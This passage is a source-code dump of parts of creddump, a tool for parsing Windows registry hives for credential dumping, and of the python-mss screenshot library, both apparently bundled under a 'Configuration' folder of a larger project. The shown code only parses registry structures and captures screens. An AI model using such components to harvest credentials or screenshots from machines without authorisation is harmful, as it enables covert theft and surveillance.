@author:       Brendan Dolan-Gavitt
@license:      GNU General Public License 2.0 or later
@contact:      bdolangavitt@wesleyan.edu
"""

from obj import *
from types import regtypes as types
from operator import itemgetter
from struct import unpack

def get_ptr_type(structure, member):
    """Return the type a pointer points to.

       Arguments:
         structure : the name of the structure from vtypes
         member : a list of members
       Example:
         get_ptr_type('_EPROCESS', ['ActiveProcessLinks', 'Flink']) => ['_LIST_ENTRY']
    """
    if len(member) > 1:
        _, tp = get_obj_offset(types, [structure, member[0]])
        if tp == 'array':
            return types[structure][1][member[0]][1][2][1]
        else:
            return get_ptr_type(tp, member[1:])
    else:
        return types[structure][1][member[0]][1][1]

class Obj(object):
    """Base class for all objects.

       May return a subclass for certain data types to allow
       for special handling.
    """

    def __new__(typ, name, address, space):
        if name in globals():
            # This is a bit of "magic"
            # Could be replaced with a dict mapping type names to types
            return globals()[name](name,address,space)
        elif name in builtin_types:
            return Primitive(name, address, space)
        else:
            obj = object.__new__(typ)
            return obj

    def __init__(self, name, address, space):
        self.name = name
        self.address = address
        self.space = space

        # Subclasses can add fields to this list if they want them
        # to show up in values() or members(), even if they do not
        # appear in the vtype definition
        self.extra_members = []

    def __getattribute__(self, attr):
        try:
            return object.__getattribute__(self, attr)
        except AttributeError:
            pass

        if self.name in builtin_types:
            raise AttributeError("Primitive types have no dynamic attributes")

        try:
            off, tp = get_obj_offset(types, [self.name, attr])
        except:
            raise AttributeError("'%s' has no attribute '%s'" % (self.name, attr))

        if tp == 'array':
            a_len = types[self.name][1][attr][1][1]
            l = []
            for i in range(a_len):
                a_off, a_tp = get_obj_offset(types, [self.name, attr, i])
                if a_tp == 'pointer':
                    ptp = get_ptr_type(self.name, [attr, i])
                    l.append(Pointer(a_tp, self.address+a_off, self.space, ptp))
                else:
                    l.append(Obj(a_tp, self.address+a_off, self.space))
            return l
        elif tp == 'pointer':
            # Can't just return a Obj here, since pointers need to also
            # know what type they point to.
            ptp = get_ptr_type(self.name, [attr])
            return Pointer(tp, self.address+off, self.space, ptp)
        else:
            return Obj(tp, self.address+off, self.space)

    def __div__(self, other):
        if isinstance(other,tuple) or isinstance(other,list):
            return Pointer(other[0], self.address, self.space, other[1])
        elif isinstance(other,str):
            return Obj(other, self.address, self.space)
        else:
            raise ValueError("Must provide a type name as string for casting")

    def members(self):
        """Return a list of this object's members, sorted by offset."""

        # Could also just return the list
        membs = [ (k, v[0]) for k,v in types[self.name][1].items()]
        membs.sort(key=itemgetter(1))
        return map(itemgetter(0),membs) + self.extra_members

    def values(self):
        """Return a dictionary of this object's members and their values"""

        valdict = {}
        for k in self.members():
            valdict[k] = getattr(self, k)
        return valdict

    def bytes(self, length=-1):
        """Get bytes starting at the address of this object.

           Arguments:
             length : the number of bytes to read. Default: size of
                this object.
        """

        if length == -1:
            length = self.size()
        return self.space.read(self.address, length)

    def size(self):
        """Get the size of this object."""

        if self.name in builtin_types:
            return builtin_types[self.name][0]
        else:
            return types[self.name][0]

    def __repr__(self):
        return "<%s @%08x>" % (self.name, self.address)

    def __eq__(self, other):
        if not isinstance(other, Obj):
            raise TypeError("Types are incomparable")
        return self.address == other.address and self.name == other.name

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.address) ^ hash(self.name)

    def is_valid(self):
        return self.space.is_valid_address(self.address)

    def get_offset(self, member):
        return get_obj_offset(types, [self.name] + member)

class Primitive(Obj):
    """Class to represent a primitive data type.

       Attributes:
         value : the python primitive value of this type
    """

    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def __init__(self, name, address, space):
        super(Primitive,self).__init__(name, address, space)
        length, fmt = builtin_types[name]
        data = space.read(address,length)
        if not data: self.value = None
        else: self.value = unpack(fmt,data)[0]

    def __repr__(self):
        return repr(self.value)

    def members(self):
        return []

class Pointer(Obj):
    """Class to represent pointers.

       value : the object pointed to
       If an attribute is not found in this instance,
       the attribute will be looked up in the referenced
       object."""

    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def __init__(self, name, address, space, ptr_type):
        super(Pointer,self).__init__(name, address, space)
        ptr_address = read_value(space, name, address)
        if ptr_type[0] == 'pointer':
            self.value = Pointer(ptr_type[0], ptr_address, self.space, ptr_type[1])
        else:
            self.value = Obj(ptr_type[0], ptr_address, self.space)

    def __getattribute__(self, attr):
        # It's still nice to be able to access things through pointers
        # without having to explicitly dereference them, so if we don't
        # find an attribute via our superclass, just dereference the pointer
        # and return the attribute in the pointed-to type.
        try:
            return super(Pointer,self).__getattribute__(attr)
        except AttributeError:
            return getattr(self.value, attr)

    def __repr__(self):
        return "<pointer to [%s @%08x]>" % (self.value.name, self.value.address)

    def members(self):
        return self.value.members()

class _UNICODE_STRING(Obj):
    """Class representing a _UNICODE_STRING
    Adds the following behavior:
      * The Buffer attribute is presented as a Python string rather
        than a pointer to an unsigned short.
      * The __str__ method returns the value of the Buffer.
    """

    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def __str__(self):
        return self.Buffer

    # Custom Attributes
    def getBuffer(self):
        return read_unicode_string(self.space, types, [], self.address)
    Buffer = property(fget=getBuffer)

class _CM_KEY_NODE(Obj):
    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def getName(self):
        return read_string(self.space, types, ['_CM_KEY_NODE', 'Name'],
            self.address, self.NameLength.value)
    Name = property(fget=getName)

class _CM_KEY_VALUE(Obj):
    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def getName(self):
        return read_string(self.space, types, ['_CM_KEY_VALUE', 'Name'],
            self.address, self.NameLength.value)
    Name = property(fget=getName)

class _CHILD_LIST(Obj):
    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def getList(self):
        lst = []
        list_address = read_obj(self.space, types,
            ['_CHILD_LIST', 'List'], self.address)
        for i in range(self.Count.value):
            lst.append(Pointer("pointer", list_address+(i*4), self.space,
                ["_CM_KEY_VALUE"]))
        return lst
    List = property(fget=getList)

class _CM_KEY_INDEX(Obj):
    def __new__(typ, *args, **kwargs):
        obj = object.__new__(typ)
        return obj

    def getList(self):
        lst = []
        for i in range(self.Count.value):
            # we are ignoring the hash value here
            off,tp = get_obj_offset(types, ['_CM_KEY_INDEX', 'List', i*2])
            lst.append(Pointer("pointer", self.address+off, self.space,
                ["_CM_KEY_NODE"]))
        return lst
    List = property(fget=getList)

```

`Configuration/creddump/obj.py`:

```py
# Volatools Basic
# Copyright (C) 2007 Komoku, Inc.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or (at
# your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
#

"""
@author:       AAron Walters and Nick Petroni
@license:      GNU General Public License 2.0 or later
@contact:      awalters@komoku.com, npetroni@komoku.com
@organization: Komoku, Inc.
"""

import struct

builtin_types = { \
    'int' : (4, 'i'), \
    'long': (4, 'i'), \
    'unsigned long' : (4, 'I'), \
    'unsigned int' : (4, 'I'), \
    'address' : (4, 'I'), \
    'char' : (1, 'c'), \
    'unsigned char' : (1, 'B'), \
    'unsigned short' : (2, 'H'), \
    'short' : (2, 'h'), \
    'long long' : (8, 'q'), \
    'unsigned long long' : (8, 'Q'), \
    'pointer' : (4, 'I'),\
    }


def obj_size(types, objname):
    if not types.has_key(objname):
        raise Exception('Invalid type %s not in types' % (objname))

    return types[objname][0]

def builtin_size(builtin):
    if not builtin_types.has_key(builtin):
        raise Exception('Invalid built-in type %s' % (builtin))

    return builtin_types[builtin][0]

def read_value(addr_space, value_type, vaddr):
    """
    Read the low-level value for a built-in type.
    """

    if not builtin_types.has_key(value_type):
        raise Exception('Invalid built-in type %s' % (value_type))

    type_unpack_char = builtin_types[value_type][1]
    type_size        = builtin_types[value_type][0]

    buf = addr_space.read(vaddr, type_size)
    if buf is None:
        return None
    (val, ) = struct.unpack(type_unpack_char, buf)

    return val

def read_unicode_string(addr_space, types, member_list, vaddr):
    offset = 0
    if len(member_list) > 1:
        (offset, current_type) = get_obj_offset(types, member_list)


    buf    = read_obj(addr_space, types, ['_UNICODE_STRING', 'Buffer'], vaddr + offset)
    length = read_obj(addr_space, types, ['_UNICODE_STRING', 'Length'], vaddr + offset)

    if length == 0x0:
        return ""

    if buf is None or length is None:
        return None

    readBuf = read_string(addr_space, types, ['char'], buf, length)

    if readBuf is None:
        return None

    try:
        readBuf = readBuf.decode('UTF-16').encode('ascii')
    except:
        return None

    return readBuf

def read_string(addr_space, types, member_list, vaddr, max_length=256):
    offset = 0
    if len(member_list) > 1:
        (offset, current_type) = get_obj_offset(types, member_list)

    val = addr_space.read(vaddr + offset, max_length)

    return val


def read_null_string(addr_space, types, member_list, vaddr, max_length=256):
    string = read_string(addr_space, types, member_list, vaddr, max_length)

    if string is None:
        return None

    if (string.find('\0') == -1):
        return string
    (string, none) = string.split('\0', 1)
    return string


def get_obj_offset(types, member_list):
    """
    Returns the (offset, type) pair for a given list
    """
    member_list.reverse()

    current_type = member_list.pop()

    offset = 0

    while (len(member_list) > 0):
        if current_type == 'array':
            current_type = member_dict[current_member][1][2][0]
            if current_type in builtin_types:
                current_type_size = builtin_size(current_type)
            else:
                current_type_size = obj_size(types, current_type)
            index = member_list.pop()
            offset += index * current_type_size
            continue

        elif not types.has_key(current_type):
            raise Exception('Invalid type ' + current_type)

        member_dict = types[current_type][1]

        current_member = member_list.pop()
        if not member_dict.has_key(current_member):
            raise Exception('Invalid member %s in type %s' % (current_member, current_type))

        offset += member_dict[current_member][0]

        current_type = member_dict[current_member][1][0]

    return (offset, current_type)


def read_obj(addr_space, types, member_list, vaddr):
    """
    Read the low-level value for some complex type's member.
    The type must have members.
    """
    if len(member_list) < 2:
        raise Exception('Invalid type/member ' + str(member_list))



    (offset, current_type) = get_obj_offset(types, member_list)
    return read_value(addr_space, current_type, vaddr + offset)

```

`Configuration/creddump/rawreg.py`:

```py
# This file is part of creddump.
#
# creddump is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# creddump is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with creddump.  If not, see <http://www.gnu.org/licenses/>.

"""
@author:       Brendan Dolan-Gavitt
@license:      GNU General Public License 2.0 or later
@contact:      bdolangavitt@wesleyan.edu
"""

from newobj import Obj,Pointer
from struct import unpack

ROOT_INDEX = 0x20
LH_SIG = unpack("<H","lh")[0]
LF_SIG = unpack("<H","lf")[0]
RI_SIG = unpack("<H","ri")[0]

def get_root(address_space):
    return Obj("_CM_KEY_NODE", ROOT_INDEX, address_space)

def open_key(root, key):
    if key == []:
        return root

    keyname = key.pop(0)
    for s in subkeys(root):
        if s.Name.upper() == keyname.upper():
            return open_key(s, key)
    print "ERR: Couldn't find subkey %s of %s" % (keyname, root.Name)
    return None

def subkeys(key,stable=True):
    if stable: k = 0
    else: k = 1
    sk = (key.SubKeyLists[k]/["pointer", ["_CM_KEY_INDEX"]]).value
    sub_list = []
    if (sk.Signature.value == LH_SIG or
            sk.Signature.value == LF_SIG):
        sub_list = sk.List
    elif sk.Signature.value == RI_SIG:
        lfs = []
        for i in range(sk.Count.value):
            off,tp = sk.get_offset(['List', i])
            lfs.append(Pointer("pointer", sk.address+off, sk.space,
                ["_CM_KEY_INDEX"]))
        for lf in lfs:
            sub_list += lf.List

    for s in sub_list:
        if s.is_valid() and s.Signature.value == 27502:
            yield s.value

def values(key):
    for v in key.ValueList.List:
        yield v.value

def walk(root):
    for k in subkeys(root):
        yield k
        for j in walk(k):
            yield j

```

`Configuration/creddump/types.py`:

```py
# This file is part of creddump.
#
# creddump is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# creddump is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with creddump.  If not, see <http://www.gnu.org/licenses/>.

"""
@author:       Brendan Dolan-Gavitt
@license:      GNU General Public License 2.0 or later
@contact:      bdolangavitt@wesleyan.edu
"""

regtypes = {
  '_CM_KEY_VALUE' : [ 0x18, {
    'Signature' : [ 0x0, ['unsigned short']],
    'NameLength' : [ 0x2, ['unsigned short']],
    'DataLength' : [ 0x4, ['unsigned long']],
    'Data' : [ 0x8, ['unsigned long']],
    'Type' : [ 0xc, ['unsigned long']],
    'Flags' : [ 0x10, ['unsigned short']],
    'Spare' : [ 0x12, ['unsigned short']],
    'Name' : [ 0x14, ['array', 1, ['unsigned short']]],
} ],
  '_CM_KEY_NODE' : [ 0x50, {
    'Signature' : [ 0x0, ['unsigned short']],
    'Flags' : [ 0x2, ['unsigned short']],
    'LastWriteTime' : [ 0x4, ['_LARGE_INTEGER']],
    'Spare' : [ 0xc, ['unsigned long']],
    'Parent' : [ 0x10, ['unsigned long']],
    'SubKeyCounts' : [ 0x14, ['array', 2, ['unsigned long']]],
    'SubKeyLists' : [ 0x1c, ['array', 2, ['unsigned long']]],
    'ValueList' : [ 0x24, ['_CHILD_LIST']],
    'ChildHiveReference' : [ 0x1c, ['_CM_KEY_REFERENCE']],
    'Security' : [ 0x2c, ['unsigned long']],
    'Class' : [ 0x30, ['unsigned long']],
    'MaxNameLen' : [ 0x34, ['unsigned long']],
    'MaxClassLen' : [ 0x38, ['unsigned long']],
    'MaxValueNameLen' : [ 0x3c, ['unsigned long']],
    'MaxValueDataLen' : [ 0x40, ['unsigned long']],
    'WorkVar' : [ 0x44, ['unsigned long']],
    'NameLength' : [ 0x48, ['unsigned short']],
    'ClassLength' : [ 0x4a, ['unsigned short']],
    'Name' : [ 0x4c, ['array', 1, ['unsigned short']]],
} ],
  '_CM_KEY_INDEX' : [ 0x8, {
    'Signature' : [ 0x0, ['unsigned short']],
    'Count' : [ 0x2, ['unsigned short']],
    'List' : [ 0x4, ['array', 1, ['unsigned long']]],
} ],
  '_CHILD_LIST' : [ 0x8, {
    'Count' : [ 0x0, ['unsigned long']],
    'List' : [ 0x4, ['unsigned long']],
} ],
}

```

`Configuration/mss/LICENSE`:

```
MIT License
Copyright (c) 2016, Mickaël 'Tiger-222' Schoentgen

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

```

`Configuration/mss/__init__.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' An ultra fast cross-platform multiple screenshots module in pure python
    using ctypes.

    This module is maintained by Mickaël Schoentgen <mickael@jmsinfo.co>.

    Note: please keep this module compatible to Python 2.6.

    You can always get the latest version of this module at:
        https://github.com/BoboTiG/python-mss
    If that URL should fail, try contacting the author.
'''

from .exception import ScreenshotError
from .factory import mss

__version__ = '2.0.0'
__author__ = "Mickaël 'Tiger-222' Schoentgen"
__copyright__ = '''
    Copyright (c) 2013-2016, Mickaël 'Tiger-222' Schoentgen

    Permission to use, copy, modify, and distribute this software and its
    documentation for any purpose and without fee or royalty is hereby
    granted, provided that the above copyright notice appear in all copies
    and that both that copyright notice and this permission notice appear
    in supporting documentation or portions thereof, including
    modifications, that you make.
'''
__all__ = ['ScreenshotError', 'mss']

```

`Configuration/mss/base.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''

from struct import pack
from zlib import compress, crc32

from .exception import ScreenshotError


# C'est parti mon kiki !
class MSSBase(object):
    ''' This class will be overloaded by a system specific one. '''

    monitors = []
    image = None
    width = 0
    height = 0

    def __enter__(self):
        ''' For the cool call `with MSS() as mss:`. '''

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        ''' For the cool call `with MSS() as mss:`. '''

    def enum_display_monitors(self, force=False):
        ''' Get positions of one or more monitors.
            If the monitor has rotation, you have to deal with it
            inside this method.

            This method has to fill self.monitors with all informations
            and use it as a cache:
                self.monitors[0] is a dict of all monitors together
                self.monitors[N] is a dict of the monitor N (with N > 0)

            Each monitor is a dict with:
            {
                'left':   the x-coordinate of the upper-left corner,
                'top':    the y-coordinate of the upper-left corner,
                'width':  the width,
                'height': the height
            }
        '''

        raise NotImplementedError('Subclasses need to implement this!')

    def get_pixels(self, monitor):
        ''' Retrieve screen pixels for a given monitor.

            This method has to define self.width and self.height.

            `monitor` is a dict with:
            {
                'left':   the x-coordinate of the upper-left corner,
                'top':    the y-coordinate of the upper-left corner,
                'width':  the width,
                'heigth': the height
            }
        '''

        raise NotImplementedError('Subclasses need to implement this!')

    def save(self, mon=0, output='monitor-%d.png', callback=lambda *x: True):
        ''' Grab a screenshot and save it to a file.

            mon (integer, default: 0)
                -1: grab one screenshot of all monitors
                 0: grab one screenshot by monitor
                 N: grab the screenshot of the monitor N

            output (string, default: monitor-%d.png)
                The output filename.
                %d, if present, will be replaced by the monitor number.

            callback (method)
                Callback called before saving the screenshot to a file.
                Take the 'output' argument as parameter.

            This is a generator which returns created files.
        '''

        self.enum_display_monitors()
        if not self.monitors:
            raise ScreenshotError('No monitor found.')

        if mon == 0:
            # One screenshot by monitor
            for i, monitor in enumerate(self.monitors[1:]):
                fname = output
                if '%d' in output:
                    fname = output.replace('%d', str(i + 1))
                callback(fname)
                self.to_png(self.get_pixels(monitor), fname)
                yield fname
        else:
            # A screenshot of all monitors together or
            # a screenshot of the monitor N.
            mon_number = 0 if mon == -1 else mon
            try:
                monitor = self.monitors[mon_number]
            except IndexError:
                err = 'Monitor {0} does not exist.'.format(mon)
                raise ScreenshotError(err)

            if '%d' in output:
                output = output.replace('%d', str(mon_number))
            callback(output)
            self.to_png(self.get_pixels(monitor), output)
            yield output

    def to_png(self, data, output):
        ''' Dump data to the image file. Data is bytes(RGBRGB...RGB).
            Pure python PNG implementation.
            http://inaps.org/journal/comment-fonctionne-le-png
        '''

        p__ = pack
        line = self.width * 3
        png_filter = p__('>B', 0)
        scanlines = b''.join(
            [png_filter + data[y * line:y * line + line]
             for y in range(self.height)])

        magic = p__('>8B', 137, 80, 78, 71, 13, 10, 26, 10)

        # Header: size, marker, data, CRC32
        ihdr = [b'', b'IHDR', b'', b'']
        ihdr[2] = p__('>2I5B', self.width, self.height, 8, 2, 0, 0, 0)
        ihdr[3] = p__('>I', crc32(b''.join(ihdr[1:3])) & 0xffffffff)
        ihdr[0] = p__('>I', len(ihdr[2]))

        # Data: size, marker, data, CRC32
        idat = [b'', b'IDAT', compress(scanlines), b'']
        idat[3] = p__('>I', crc32(b''.join(idat[1:3])) & 0xffffffff)
        idat[0] = p__('>I', len(idat[2]))

        # Footer: size, marker, None, CRC32
        iend = [b'', b'IEND', b'', b'']
        iend[3] = p__('>I', crc32(iend[1]) & 0xffffffff)
        iend[0] = p__('>I', len(iend[2]))

        with open(output, 'wb') as fileh:
            fileh.write(magic)
            fileh.write(b''.join(ihdr))
            fileh.write(b''.join(idat))
            fileh.write(b''.join(iend))
            return

        err = 'Error writing data to "{0}".'.format(output)
        raise ScreenshotError(err)

```

`Configuration/mss/darwin.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''

# pylint: disable=import-error

from ctypes import (
    POINTER, Structure, byref, c_double, c_float, c_int32, c_ubyte, c_uint32,
    c_void_p, cast, cdll)
from ctypes.util import find_library
from sys import maxsize

from .base import MSSBase
from .exception import ScreenshotError

__all__ = ['MSS']


def cgfloat():
    ''' Get the appropriate value for a float. '''

    return c_double if maxsize > 2 ** 32 else c_float


def get_infinity(maxi=False):
    ''' Get infinity "numbers". '''

    return 1.7976931348623157e+308 if maxi else -8.988465674311579e+307


class CGPoint(Structure):
    ''' Structure that contains coordinates of a rectangle. '''

    _fields_ = [('x', cgfloat()), ('y', cgfloat())]


class CGSize(Structure):
    ''' Structure that contains dimensions of an rectangle. '''

    _fields_ = [('width', cgfloat()), ('height', cgfloat())]


class CGRect(Structure):
    ''' Structure that contains informations about a rectangle. '''

    _fields_ = [('origin', CGPoint), ('size', CGSize)]


class MSS(MSSBase):
    ''' Mutliple ScreenShots implementation for MacOS X.
        It uses intensively the Quartz.
    '''

    max_displays = 32  # Could be augmented, if needed ...

    def __init__(self):
        ''' MacOS X initialisations. '''

        coregraphics = find_library('CoreGraphics')
        if not coregraphics:
            raise ScreenshotError('No CoreGraphics library found.')
        self.core = cdll.LoadLibrary(coregraphics)

        self._set_argtypes()
        self._set_restypes()

    def _set_argtypes(self):
        ''' Functions arguments. '''

        self.core.CGGetActiveDisplayList.argtypes = \
            [c_uint32, POINTER(c_uint32), POINTER(c_uint32)]
        self.core.CGDisplayBounds.argtypes = [c_uint32]
        self.core.CGRectStandardize.argtypes = [CGRect]
        self.core.CGDisplayRotation.argtypes = [c_uint32]
        self.core.CGWindowListCreateImage.argtypes = \
            [CGRect, c_uint32, c_uint32, c_uint32]
        self.core.CGImageGetWidth.argtypes = [c_void_p]
        self.core.CGImageGetHeight.argtypes = [c_void_p]
        self.core.CGImageGetDataProvider.argtypes = [c_void_p]
        self.core.CGDataProviderCopyData.argtypes = [c_void_p]
        self.core.CFDataGetBytePtr.argtypes = [c_void_p]
        self.core.CGDataProviderRelease.argtypes = [c_void_p]

    def _set_restypes(self):
        ''' Functions return type. '''

        self.core.CGGetActiveDisplayList.restype = c_int32
        self.core.CGDisplayBounds.restype = CGRect
        self.core.CGRectStandardize.restype = CGRect
        self.core.CGDisplayRotation.restype = c_float
        self.core.CGWindowListCreateImage.restype = c_void_p
        self.core.CGImageGetWidth.restype = c_uint32
        self.core.CGImageGetHeight.restype = c_uint32
        self.core.CGImageGetDataProvider.restype = c_void_p
        self.core.CGDataProviderCopyData.restype = c_void_p
        self.core.CFDataGetBytePtr.restype = c_void_p
        self.core.CGDataProviderRelease.restype = c_void_p

    def enum_display_monitors(self, force=False):
        ''' Get positions of monitors (see parent class). '''

        if not self.monitors or force:
            self.monitors = []

            # All monitors
            self.monitors.append({
                'left': int(get_infinity()),
                'top': int(get_infinity()),
                'width': int(get_infinity(True)),
                'height': int(get_infinity(True))
            })

            # Each monitors
            display_count = c_uint32(0)
            active_displays = (c_uint32 * self.max_displays)()
            self.core.CGGetActiveDisplayList(self.max_displays,
                                             active_displays,
                                             byref(display_count))
            rotations = {0.0: 'normal', 90.0: 'right', -90.0: 'left'}
            for idx in range(display_count.value):
                display = active_displays[idx]

                rect = self.core.CGDisplayBounds(display)
                rect = self.core.CGRectStandardize(rect)
                left, top = rect.origin.x, rect.origin.y
                width, height = rect.size.width, rect.size.height
                rot = self.core.CGDisplayRotation(display)
                if rotations[rot] in ['left', 'right']:
                    width, height = height, width
                self.monitors.append({
                    'left': int(left),
                    'top': int(top),
                    'width': int(width),
                    'height': int(height)
                })

        return self.monitors

    def get_pixels(self, monitor):
        ''' Retrieve all pixels from a monitor. Pixels have to be RGB. '''

        width, height = monitor['width'], monitor['height']
        left, top = monitor['left'], monitor['top']
        rect = CGRect((left, top), (width, height))

        image_ref = self.core.CGWindowListCreateImage(rect, 1, 0, 0)
        if not image_ref:
            err = 'CoreGraphics.CGWindowListCreateImage() failed.'
            raise ScreenshotError(err)

        self.width = int(self.core.CGImageGetWidth(image_ref))
        self.height = int(self.core.CGImageGetHeight(image_ref))
        prov = self.core.CGImageGetDataProvider(image_ref)
        data = self.core.CGDataProviderCopyData(prov)
        data_ref = self.core.CFDataGetBytePtr(data)
        buf_len = self.height * self.width * 4  # or CFDataGetLength()
        data = cast(data_ref, POINTER(c_ubyte * buf_len))
        self.core.CGDataProviderRelease(prov)

        # Replace pixels values: BGRA to RGB.
        image_data = bytearray(data.contents)
        image = bytearray(self.height * self.width * 3)
        image[0::3], image[1::3], image[2::3] = \
            image_data[2::4], image_data[1::4], image_data[0::4]
        self.image = bytes(image)
        return self.image

```

`Configuration/mss/exception.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''


class ScreenshotError(Exception):
    ''' Error handling class. '''

```

`Configuration/mss/factory.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''

from platform import system

from .exception import ScreenshotError


def mss(*args, **kwargs):
    ''' Factory returning a proper MSS class instance.

        It detects the plateform we are running on
        and choose the most adapted mss_class to take
        screenshots.

        It then proxies its arguments to the class for
        instantiation.
    '''

    operating_system = system().lower()
    if operating_system == 'darwin':
        from .darwin import MSS
    elif operating_system == 'linux':
        from .linux import MSS
    elif operating_system == 'windows':
        from .windows import MSS
    else:
        err = 'System "{0}" not implemented.'.format(operating_system)
        raise ScreenshotError(err)

    return MSS(*args, **kwargs)

```

`Configuration/mss/linux.py`:

```py
#!/usr/bin/env python
# coding: utf-8
''' This is part of the MSS Python's module.
    Source: https://github.com/BoboTiG/python-mss
'''

from ctypes import (
    POINTER, Structure, byref, c_char_p, c_int, c_int32, c_long, c_uint,
    c_uint32, c_ulong, c_ushort, c_void_p, cast, cdll, create_string_buffer)
from ctypes.util import find_library
from os import environ
from os.path import abspath, dirname, isfile, realpath
from struct import pack
from sys import maxsize, version

from .base import MSSBase
from .exception import ScreenshotError

__all__ = ['MSS']


class Display(Structure):
    ''' Structure that serves as the connection to the X server
        and that contains all the information about that X server.
    '''


class XWindowAttributes(Structure):
    ''' Attributes for the specified window. '''

    _fields_ = [('x', c_int32), ('y', c_int32), ('width', c_int32),
                ('height', c_int32), ('border_width', c_int32),
                ('depth', c_int32), ('visual', c_ulong), ('root', c_ulong),
                ('class', c_int32), ('bit_gravity', c_int32),
                ('win_gravity', c_int32), ('backing_store', c_int32),
                ('backing_planes', c_ulong), ('backing_pixel', c_ulong),
                ('save_under', c_int32), ('colourmap', c_ulong),
                ('mapinstalled', c_uint32), ('map_state', c_uint32),
                ('all_event_masks', c_ulong), ('your_event_mask', c_ulong),
                ('do_not_propagate_mask', c_ulong),
                ('override_redirect', c_int32), ('screen', c_ulong)]


class XImage(Structure):
    ''' Description of an image as it exists in the client's memory.
        https://tronche.com/gui/x/xlib/graphics/images.html
    '''

    _fields_ = [('width', c_int), ('height', c_int), ('xoffset', c_int),
                ('format', c_int), ('data', c_void_p),
                ('byte_order', c_int), ('bitmap_unit', c_int),
                ('bitmap_bit_order', c_int), ('bitmap_pad', c_int),
                ('depth', c_int), ('bytes_per_line', c_int),
                ('bits_per_pixel', c_int), ('red_mask', c_ulong),
                ('green_mask', c_ulong), ('blue_mask', c_ulong)]


class XRRModeInfo(Structure):
    ''' Voilà, voilà. '''


class XRRScreenResources(Structure):
    ''' Structure that contains arrays of XIDs that point to the
        available outputs and associated CRTCs.
    '''

    _fields_ = [('timestamp', c_ulong), ('configTimestamp', c_ulong),
                ('ncrtc', c_int), ('crtcs', POINTER(c_long)),
                ('noutput', c_int), ('outputs', POINTER(c_long)),
                ('nmode', c_int), ('modes', POINTER(XRRModeInfo))]


class XRRCrtcInfo(Structure):
    ''' Structure that contains CRTC informations. '''

    _fields_ = [('timestamp', c_ulong), ('x', c_int), ('y', c_int),
                ('width', c_int), ('height', c_int), ('mode', c_long),
                ('rotation', c_int), ('noutput', c_int),
                ('outputs', POINTER(c_long)), ('rotations', c_ushort),
                ('npossible', c_int), ('possible', POINTER(c_long))]


class MSS(MSSBase):
    ''' Mutliple ScreenShots implementation for GNU/Linux.
        It uses intensively the Xlib and Xrandr extension.
    '''

    # pylint: disable=too-many-instance-attributes

    display = None
    use_mss = False
    mss = None
    xlib = None
    xrandr = None
    display = None
    root = None

    def __del__(self):
        ''' Disconnect from X server. '''

        if self.display:
            self.xlib.XCloseDisplay(self.display)
            self.display = None

    def __init__(self, display=None):
        ''' GNU/Linux initialisations. '''

        if not display:
            try:
                if version > '3':
                    display = bytes(environ['DISPLAY'], 'utf-8')
                else:
                    display = environ['DISPLAY']
            except KeyError:
                err = '$DISPLAY not set. Stopping to prevent segfault.'
                raise ScreenshotError(err)

        x11 = find_library('X11')
        if not x11:
            raise ScreenshotError('No X11 library found.')
        self.xlib = cdll.LoadLibrary(x11)

        xrandr = find_library('Xrandr')
        if not xrandr:
            raise ScreenshotError('No Xrandr extension found.')
        self.xrandr = cdll.LoadLibrary(xrandr)

        # libmss = find_library('mss')
        libmss = '{0}/linux/{1}/libmss.so'.format(
            dirname(realpath(abspath(__file__))), arch())
